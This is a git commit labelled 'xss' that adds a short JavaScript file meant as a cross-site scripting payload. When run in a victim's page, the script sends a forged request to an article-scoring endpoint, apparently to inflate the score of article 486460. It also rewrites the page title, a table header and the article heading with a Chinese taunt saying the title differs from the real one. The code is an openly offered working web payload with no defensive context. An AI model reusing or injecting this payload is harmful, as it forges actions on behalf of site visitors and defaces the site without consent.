e86aec5b8763bfb228a34f4927b5a6a03b627d82
JohnnyCage <jaguarsy14@gmail.com>
2015-06-25 10:57:56 +0800

    xss

---
+++ awsome.js
@@ -0,0 +1,4 @@
+$.get('/Universal/Do_AddArticleScore.aspx?aid=486460&random='+new Date().getTime());
+$('table th')[0].innerText = '你会发现这个标题跟外面的不一样';
+$('#articlecontent h1')[0].innerText = '你会发现这个标题跟外面的不一样';
+document.title='你会发现这个标题跟外面的不一样';
